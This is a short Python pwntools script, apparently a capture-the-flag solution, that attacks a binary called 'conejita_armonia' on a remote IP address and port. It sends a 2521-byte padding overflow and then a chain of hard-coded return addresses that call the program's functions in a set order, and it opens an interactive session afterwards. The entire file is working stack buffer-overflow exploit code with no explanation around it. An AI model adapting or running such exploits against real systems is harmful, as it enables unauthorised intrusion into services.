from pwn import *


#print(cyclic_find(0x657a6161))
#p = process("./conejita_armonia")

#gdb.attach(p)

p = remote("52.33.132.169", 1442)


p0 = 0x40134d
f1 = 0x4011dd
f2 = 0x401228
f3 = 0x401273
f4 = 0x4012bf
f5 = 0x40130a + 0x4 #porque 0a termina la cadena lol
f6 = 0x40132d

p.sendlineafter("voy yo", (b"A"*2521 + p64(f6) + p64(f3) + p64(f1) + p64(f2) + p64(f4) + p64(f5)))



p.interactive()
